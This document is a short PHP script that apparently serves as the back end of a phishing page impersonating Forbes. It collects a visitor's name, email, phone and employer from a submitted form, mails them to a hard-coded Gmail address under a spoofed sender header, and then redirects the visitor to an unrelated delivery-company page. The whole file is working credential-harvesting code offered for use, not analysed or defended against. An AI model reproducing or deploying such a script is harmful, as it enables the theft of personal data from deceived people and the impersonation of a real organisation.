<?php
   $message = "";
	$message .= "---|From Forbes|---\n";
    $message .= "name : " . $_POST['EM'] . "\n"; 
    $message .= "email: " . $_POST['EMA'] . "\n"; 
    $message .= "phone : " . $_POST['EMAI'] . "\n"; 
    $message .= "employ : " . $_POST['EMAIL'] . "\n"; 

    
	$to ="Nolanprpic14@gmail.com";

	$subject = "Information from website  ";
	$headers = "From: Micheal<Micheal@nigerianpresident.com>";
	
	$send = mail($to,$subject,$message,$headers);
	if($send){
		header("Location: https://www.redrocketdelivery.com/contacted.html");
	}
?>

